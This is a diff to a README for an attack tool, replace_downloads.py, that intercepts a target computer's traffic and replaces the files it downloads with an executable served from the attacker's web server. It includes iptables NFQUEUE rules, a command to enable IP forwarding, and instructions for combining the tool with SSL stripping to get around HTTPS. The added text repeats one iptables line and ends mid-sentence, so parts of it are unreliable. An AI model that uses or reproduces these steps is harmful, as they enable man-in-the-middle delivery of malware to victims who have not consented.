@@ -4,14 +4,18 @@ This program assumes you are running a static web server and will be providing a
 You may also use this program with HTTPS. Check out the README file to see how to bypass HTTPS.
 
 Before running the program:
--You will need to intercept the packets from the target computer and forward them. To achieve this type the following 
-command on the Linux bash terminal:
+1. You will need to intercept the packets from the target computer and forward them. 
+If you do know need to bypass HTTPS, you will need to type the following command on the Linux bash terminal:
 iptables -I FORWARD -j NFQUEUE --queue-num 0
 
--You will also need to allow the target to have internet connection. Type in the terminal:
+You will also need to allow the target to have internet connection. Type in the terminal:
 echo 1 > /proc/sys/net/ipv4/ip_forward
 
--Do not forget to start the web server you will use to provide target with the executable file. Type in terminal:
+Instead, if you are using SSL STRIP, you only need to type in the terminal:
+iptables -I OUTPUT -j NFQUEUE --queue-num 0
+iptables -I OUTPUT -j NFQUEUE --queue-num 0
+
+2. Do not forget to start the web server you will use to provide target with the executable file. Type in terminal:
 service apache2 start
 
 Optional: If you previously modified the iptables, you will ned to flush the previous rules. Type in terminal:
@@ -21,6 +25,8 @@ iptables --flush
 
 Now, on the replace_downloads.py file you will need to input the IP of your static web server and the absolute URL
 where the target will get the executable from. Use "cat replace_downloads.py" to see where to make these changes.
+If your target will download a file form an HTTP page, leave the code as it is. However if your target will use HTTPS, you
+need to change 
 
 Once you have finished, do not forget to flush your iptables rules by typing in the terminal:
 iptables --flush.
